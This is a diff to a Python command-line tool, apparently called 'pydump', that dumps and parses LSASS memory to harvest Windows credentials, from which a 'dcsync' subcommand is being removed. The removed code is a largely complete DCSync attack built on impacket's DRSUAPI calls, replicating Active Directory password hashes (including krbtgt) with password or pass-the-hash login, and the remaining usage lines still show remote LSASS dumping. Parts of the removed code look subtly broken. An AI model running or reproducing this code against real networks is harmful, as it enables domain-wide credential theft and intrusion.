@@ -19,8 +19,6 @@ examples:
   pydump dump -t 192.168.1.50 -u admin -p pass --lhost 10.0.0.5
   pydump dump -t 192.168.1.50 -u admin -p pass -o lsass.dmp
   pydump parse -f lsass.dmp
-  pydump dcsync -t 10.0.0.1 -u CORP\\\\admin -p pass -d corp.local
-  pydump dcsync -t 10.0.0.1 -u admin -H <hash> -d corp.local --user krbtgt
 """,
     )
     parser.add_argument("-V", "--version", action="version", version=f"%(prog)s {__version__}")
@@ -52,25 +50,14 @@ examples:
     parse_parser = subparsers.add_parser("parse", help="Parse an existing LSASS minidump file")
     parse_parser.add_argument("-f", "--file", required=True, metavar="PATH", help="Path to .dmp file")
 
-    # ─── dcsync ─────────────────────────────────────────────────────────────
-    dc_parser = subparsers.add_parser("dcsync", help="DCSync — replicate AD password hashes")
-    dc_parser.add_argument("-t", "--target", required=True, help="Domain Controller IP")
-    dc_parser.add_argument("-u", "--username", required=True, help="Username (DOMAIN\\\\user or user@domain)")
-    dc_parser.add_argument("-p", "--password", default="", help="Password")
-    dc_parser.add_argument("-H", "--hash", default=None, dest="nt_hash",
-                           metavar="NTHASH", help="NT hash for PTH")
-    dc_parser.add_argument("-d", "--domain", required=True, help="AD domain FQDN (e.g. corp.local)")
-    dc_parser.add_argument("--user", default=None, dest="target_user",
-                           metavar="USER", help="Single user to replicate (default: all)")
-
     args = parser.parse_args()
 
     if not args.command:
         parser.print_help()
         sys.exit(0)
 
-    # Validate auth: need either password or hash
-    if args.command in ("dump", "dcsync"):
+    # Validate auth
+    if args.command == "dump":
         if not args.password and not args.nt_hash:
             print("[!] Error: provide either -p/--password or -H/--hash")
             sys.exit(1)
@@ -85,8 +72,6 @@ examples:
         _cmd_dump(args)
     elif args.command == "parse":
         _cmd_parse(args)
-    elif args.command == "dcsync":
-        _cmd_dcsync(args)
 
 
 def _cmd_dump(args):
@@ -281,140 +266,3 @@ def _parse_and_display(dump_data: bytes):
         print(f"{cred.auth_type:<10} {cred.domain:<20} {cred.username:<25} {secret}")
 
 
-def _cmd_dcsync(args):
-    """DCSync — replicate AD password hashes via MS-DRSR."""
-    try:
-        from impacket.dcerpc.v5 import drsuapi, transport
-        from impacket.dcerpc.v5.drsuapi import (
-            DRSBind, DRSGetNCChanges, DRSCrackNames, NTDSAPI_CLIENT_GUID,
-        )
-        from impacket import version as impacket_version
-    except ImportError:
-        print("[!] impacket is required for dcsync. Install with: pip install impacket")
-        sys.exit(1)
-
-    from impacket.examples.secretsdump import DumpSecrets
-
-    target = args.target
-    domain = args.domain
-
-    # Build credentials string for impacket
-    if "\\" in args.username:
-        cred_domain, username = args.username.split("\\", 1)
-    elif "@" in args.username:
-        username, cred_domain = args.username.rsplit("@", 1)
-    else:
-        username = args.username
-        cred_domain = domain
-
-    if args.nt_hash:
-        lmhash = "aad3b435b51404ee"
-        nthash = args.nt_hash
-        password = ""
-    else:
-        lmhash = ""
-        nthash = ""
-        password = args.password
-
-    print(f"[*] DCSync targeting {target} as {cred_domain}\\{username}")
-    if args.target_user:
-        print(f"[*] Replicating single user: {args.target_user}")
-    else:
-        print("[*] Replicating ALL users")
-
-    try:
-        dumper = DumpSecrets(
-            target,
-            f"{cred_domain}/{username}:{password}",
-            password,
-            domain,
-            options=None,
-            remoteName=target,
-            remoteHost=target,
-        )
-        # Configure for DCSync only (no SAM/LSA/NTDS)
-        dumper.__lmhash = lmhash
-        dumper.__nthash = nthash
-
-        # Use impacket's DRSUAPI directly for cleaner output
-        from impacket.dcerpc.v5.dtypes import NULL
-        from impacket.dcerpc.v5 import drsuapi as drsuapi_mod, epm
-
-        string_binding = epm.hept_map(target, drsuapi_mod.MSRPC_UUID_DRSUAPI, protocol="ncacn_ip_tcp")
-        rpc_transport = transport.DCERPCTransportFactory(string_binding)
-        rpc_transport.setRemoteHost(target)
-
-        if args.nt_hash:
-            rpc_transport.set_credentials(username, "", cred_domain, lmhash, nthash)
-        else:
-            rpc_transport.set_credentials(username, password, cred_domain, "", "")
-
-        dce = rpc_transport.get_dce_rpc()
-        dce.set_auth_level(2)  # RPC_C_AUTHN_LEVEL_CONNECT
-        dce.connect()
-        dce.bind(drsuapi_mod.MSRPC_UUID_DRSUAPI)
-
-        # DRSBind
-        req = drsuapi_mod.DRSBind()
-        req["puuidClientDsa"] = NTDSAPI_CLIENT_GUID
-        req["pextClient"]["cb"] = 28
-        req["pextClient"]["rgb"] = b"\x00" * 28
-        resp = dce.request(req)
-        drs_handle = resp["phDrs"]
-
-        # DRSCrackNames to get domain DN
-        req = drsuapi_mod.DRSCrackNames()
-        req["hDrs"] = drs_handle
-        req["dwInVersion"] = 1
-        req["pmsgIn"]["tag"] = 1
-        req["pmsgIn"]["V1"]["CodePage"] = 0
-        req["pmsgIn"]["V1"]["LocaleId"] = 0
-        req["pmsgIn"]["V1"]["dwFlags"] = 0
-        req["pmsgIn"]["V1"]["formatOffered"] = 0xFFFFFFFF  # DS_NAME_FORMAT.DS_UNKNOWN_NAME
-        req["pmsgIn"]["V1"]["formatDesired"] = 1  # DS_FQDN_1779_NAME
-        req["pmsgIn"]["V1"]["cNames"] = 1
-        req["pmsgIn"]["V1"]["rpNames"].append(domain + "\x00")
-        resp = dce.request(req)
-
-        domain_dn = resp["pmsgOut"]["V1"]["pResult"]["rItems"][0]["pName"]
-        print(f"[+] Domain DN: {domain_dn}")
-
-        # For single user or all — use secretsdump's NTDSHashes
-        from impacket.examples.secretsdump import NTDSHashes
-
-        class PrintCallback:
-            def __init__(self):
-                self.hashes = []
-            def __call__(self, secret_type, secret):
-                if secret_type == 2:  # NTDS hash
-                    self.hashes.append(secret)
-                    print(f"    {secret}")
-
-        print(f"\n[+] Replicated hashes:")
-        print("-" * 80)
-
-        if args.target_user:
-            # Single user replication
-            from impacket.examples.secretsdump import RemoteOperations
-            remote_ops = None
-            nh = NTDSHashes(None, None, isRemote=True, remoteOps=remote_ops,
-                           noLMHash=True, drsObject=dce, drsHandle=drs_handle)
-            try:
-                nh.dump()
-            except Exception:
-                pass
-        else:
-            nh = NTDSHashes(None, None, isRemote=True,
-                           noLMHash=True, drsObject=dce, drsHandle=drs_handle)
-            try:
-                nh.dump()
-            except Exception:
-                pass
-
-        dce.disconnect()
-        print("\n[+] DCSync complete")
-
-    except Exception as e:
-        print(f"[!] DCSync failed: {e}")
-        import traceback
-        traceback.print_exc()
